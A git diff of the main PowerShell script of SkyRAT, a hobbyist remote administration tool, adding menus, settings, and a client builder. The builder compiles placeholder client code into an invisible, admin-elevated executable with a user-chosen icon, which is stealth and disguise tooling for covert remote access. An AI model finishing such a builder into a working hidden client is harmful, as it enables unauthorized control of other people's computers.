@@ -1,4 +1,6 @@
 ﻿
+############################################################################################################################################################################################
+
 ###    .x####.   .####x.                .#####* ##               #######     ###  ########
 ###   '     '*###*'     '               ##.     ##..##* ##.  .## ##*  *##   ## ##   '##'
 ###                    .x##.  .##x.      *####. ###*'    *#.##*' ##...###   ##.##    ##
@@ -8,15 +10,15 @@
 ############################################################################################################################################################################################
 
 #  A Powershell Remote Administration Tool
-#  Built by YSCHGroup using the Windows PowerShell Framework.
-#  (Please note that we do not encurage you to do anyting illegal with this tool.)
+#  Built with love <3 by YSCHGroup using the Windows PowerShell Framework.
+#  (Please note that we do not encurage you to do anyting illegal with this tool. )
 
 ############################################################################################################################################################################################
 
 function load-banner {
     # This function get the content from the banner.txt file inside the data folder and displays it with the correct colors etc.
     # It replaces each color tag with an new write-host fuction with special properties, and then revokes the whole command line as an cmdlet.
-    $banner = Get-Content "data\banners.txt" | out-string;
+    $banner = Get-Content "$global:SkyratHome\data\banners\1.txt" | out-string;
     $banner = $banner.Replace("<>", "write-host '';");
     $banner = $banner.Replace("<..>", """; ");
     $banner = $banner.Replace("<.>", """ -nonewline; ");
@@ -30,11 +32,11 @@ function load-banner {
 
 
 function display-splash {
-    Write-Host "    Welcome $env:UserName to SkyR.A.T!
-    An Remote Administrator Tool built by YSCHGroup using the Windows PowerShell Framework.
+    Write-Host "    Welcome $env:UserName to SkyRAT!
+    An Remote Administrator Tool built with love using the Windows PowerShell Framework.
     (Please note that we do not encurage you to do anyting illegal with this tool.)
+    //YSCHGroup
 
-    Type 'help' for more information...
     " -f Yellow;
 }
 
@@ -57,6 +59,27 @@ function display-clients {
     Write-Host "    ┖──────╼━━━━━━━━━━━━━━╾──────┚" -f gray;
 }
 
+function load-settings {
+    if (Test-Path "$global:SkyratHome\data\config.dat") {
+        # Set Default Settings
+        $global:HostIp = "[Not Set]"
+        
+        # Load Settings
+        $settings = Get-Content "$global:SkyratHome\data\config.dat"
+        foreach ($setting in $settings) {
+            $setting = $setting.ToLower().Split(" ")
+            switch($setting[0]) {
+                "hostip" {
+                        $global:HostIp = $setting[2]
+                    }
+            }
+        }
+
+    }else {
+        # Create Settings file
+        "" > "$global:SkyratHome\data\config.dat"
+    }
+}
 
 
 
@@ -66,15 +89,17 @@ function skyrat-execute($cmd) {                         ########################
     Command                Description
     ¨¨¨¨¨¨¨                ¨¨¨¨¨¨¨¨¨¨¨
   ::Core Commands::
-    help                   Help menu
+    help (issue/command)   Show the help menu etc                            [Under Construction]
     build                  Build a new client exe file                       [Under Construction]
-    clients                List all online clients
+    clients                List all online clients                           [Under Construction]
     connect                Connect to a client and start sending packages    [Under Construction]
     settings               Manage all settings                               [Under Construction]
     shell                  Open a shell on the local computer
+    update                 Find the lates version of SkyRAT
     version                Display the current version number
     cls                    Clear screen
     menu                   Display the menu again
+    restart                Restart SkyRAT
     exit                   Exit out from SkyRAT
 
   ::Other Commands::
@@ -87,11 +112,34 @@ function skyrat-execute($cmd) {                         ########################
   ::Shell Commands::
     skyrat/back/exit       Return to the SkyRAT interface
 
+  _____________________________________________________________
 
-  (If you see weird unicode characters above, change the console font to Consolas!)
+
+  (If you see weird unicode characters above, change the console font to Consolas!
+  For more help, see 'help font')
+
+
   If you'd like to run SkyRAT from a cmd/ps promp, just use the command 'skyrat'!
 
 "
+    }elseif ($SkyRAT_input.ToLower() -eq "help font") {                                 # Help font
+        Write-Host "
+    Help: Font    
+    ¨¨¨¨¨¨¨¨¨¨
+    If you see weird unicode characters in the main menu or when drawing the clients box,
+    change the console font to some of these below:
+
+        Consolas
+        Hack
+        Inconsolata
+        MS Gothic
+        MS Mincho
+
+    Change a console font by right-click the titlebar, go into properties, and characters.
+    There's a box which you can select different fonts.
+"
+
+
     }elseif ($SkyRAT_input.ToLower() -eq "shell") {                                 # Shell
         skyrat-shell
 
@@ -110,34 +158,46 @@ function skyrat-execute($cmd) {                         ########################
         if($dlg.ShowDialog() -eq 'Ok'){
             # Generate file
             if ($dlg.FileName.EndsWith("exe")) {
-                Write-Host "----- EXE" -f yellow;
-                $iconPath = Read-Host "Icon file path"
-                GenerateClient-PS1("$pwd\temp.ps1", $HostIP, $TcpPort);
-                & '.\data\ps1_exe.exe' -ps1 "temp.ps1" -save $dlg.filename -icon $iconPath -invisible -overwrite -admin     # Call the ps1 to exe program
-
+                Write-Host "----- " -f darkGray -NoNewline;Write-Host "EXE" -f red -NoNewline;Write-Host " -----" -f darkGray;
+                Write-Host "(space to dismiss settings below)" -f darkGray;
+                $iconPath = Read-Host "Icon file path [path]"
+                $admin = Read-Host "Run as admin? [y]"
+                "
+                [Client Code for ps1 here]
+                Connect To: $HostIP :$TcpPort
+                Start-Process 'www.google.se'
+                ">"$global:SkyratHome\temp.ps1"
+                start-sleep -s 2;
+                if ($iconPath -and $admin) { &"$global:SkyratHome\assets\modules\ps1_exe.exe" -ps1 "$global:SkyratHome\temp.ps1" -save $dlg.filename -icon "$iconPath" -invisible -overwrite -admin; Remove-Item "$global:SkyratHome\temp.ps1"; }    # Call the ps1 to exe program with all different settings
+                elseif ($iconPath) { &"$global:SkyratHome\assets\modules\ps1_exe.exe" -ps1 "$global:SkyratHome\temp.ps1" -save $dlg.filename -icon "$iconPath" -invisible; Remove-Item "$global:SkyratHome\temp.ps1"; }
+                elseif ($admin) { &"$global:SkyratHome\assets\modules\ps1_exe.exe" -ps1 "$global:SkyratHome\temp.ps1" -save $dlg.filename -invisible -overwrite -admin; Remove-Item "$global:SkyratHome\temp.ps1"; }
+                else {&"$global:SkyratHome\assets\modules\ps1_exe.exe" -ps1 "$global:SkyratHome\temp.ps1" -save $dlg.filename -invisible; Remove-Item "$global:SkyratHome\temp.ps1"; }
             }elseif ($dlg.FileName.EndsWith("bat")) {
-                Write-Host "----- BAT" -f yellow;
+                Write-Host "----- " -f darkGray -NoNewline;Write-Host "BAT" -f red -NoNewline;Write-Host " -----" -f darkGray;
                 "
                 [Client Code for bat here]
-                " | Out-File $dlg.filename
-
+                Connect To: $HostIP :$TcpPort
+                ">$($dlg.filename)
             }elseif ($dlg.FileName.EndsWith("ps1")) {
-                Write-Host "----- PS1" -f yellow;
-                GenerateClient-PS1($dlg.filename, $HostIP, $TcpPort);
-
+                Write-Host "----- " -f darkGray -NoNewline;Write-Host "PS1" -f red -NoNewline;Write-Host " -----" -f darkGray;
+                "
+                [Client Code for ps1 here]
+                Connect To: $HostIP :$TcpPort
+                ">$($dlg.filename)
             }elseif ($dlg.FileName.EndsWith("txt")) {
-                Write-Host "----- TXT" -f yellow;
+                Write-Host "----- " -f darkGray -NoNewline;Write-Host "TXT" -f red -NoNewline;Write-Host " -----" -f darkGray;
                 "
                 [Client Code for txt here]
-                " | Out-File $dlg.filename
-
+                Connect To: $HostIP :$TcpPort
+                ">$($dlg.filename)
             }else {
-                Write-Host "----- OUTPUT" -f yellow;
+                Write-Host "----- " -f darkGray -NoNewline;Write-Host "OTHER" -f red -NoNewline;Write-Host " -----" -f darkGray;
                 "
                 [Client Code for other here]
-                " | Out-File $dlg.filename
+                Connect To: $HostIP :$TcpPort
+                ">$($dlg.filename)
             }
-            Write-host "[!] Generating $($dlg.filename)..." -f Green;
+            Write-host "[:)] Generating $($dlg.filename)..." -f Green;
         }else {
             Write-Host "[!] Save interrupted, interrupts client generation..." -f Red;
         }
@@ -219,9 +279,25 @@ function skyrat-execute($cmd) {                         ########################
                 break;
             }
         }
+    }elseif ($SkyRAT_input.ToLower() -eq "settings") {                                      # settings
+        load-settings
+        Write-Host "
+    Setting                Set Value
+    ¨¨¨¨¨¨¨                ¨¨¨¨¨¨¨¨¨
+    host ip                $global:HostIp
+
+"
+        
+    }elseif ($SkyRAT_input.ToLower() -eq "restart") {                                      # restart
+        cls
+        .\$global:SkyratHome\data\main.ps1
     }elseif ($SkyRAT_input.ToLower() -eq "exit") {                                      # exit
         exit;
 
+    }elseif ($SkyRAT_input.ToLower() -eq "update") {                                      # exit
+        Write-Host "The latest version of SkyRat can be found here: https://github.com/YSCHGroup/SkyRAT" -f Green;
+        Write-Host "[Opens github repository...]" -f DarkGray;
+        Start-Process "https://github.com/YSCHGroup/SkyRAT"
     }elseif ($SkyRAT_input.ToLower() -eq "") {                                      # New Command
         # Execute all code inside here
 
@@ -235,12 +311,8 @@ function noteREM($remLine) {
 }
                                                            ##########################################################################################################
 
-# Client Generation
-function GenerateClient-PS1($filePath, $hostIP, $port) {
-    "
-    [Client Code for ps1 here]
-    " | Out-File $filePath
-}
+
+
 
 
 # SkyRAT
@@ -279,17 +351,34 @@ function skyrat-shell {
 [Console]::OutputEncoding = [Text.UTF8Encoding]::UTF8
 $PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'
 $SkyratVersion = "v1.0.0 (Alpha)"
-(Get-Item -Path ".\" -Verbose).FullName | Out-File "C:\tmp\skyhome.txt"                            # Output file folder to a temp file used when executing the program from a cmd prompt
+
+# Get Home Folder to execute programs etc from
+if (Test-Path C:\tmp\skyhome.txt) {
+    $global:SkyratHome = Get-Content C:\tmp\skyhome.txt
+}else {
+    cls
+    Write-Host "Error! Please install SkyRAT before launching it!" -f Red;
+    Start-Sleep -s 2;
+    Write-Host "Press any key to continue ..."
+
+    $x = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+    exit
+}
+
+
 
 # Main loop
 function main {
     load-banner
     display-splash
+    load-settings
     display-clients
-    Write-Host; # Blank space
+    Write-Host "`n    Type 'help' for more information...`n" -f darkGray;
     skyrat-input
 }
 
-
-main;
+while($true){
+    cls
+    main;
+}
 Read-Host
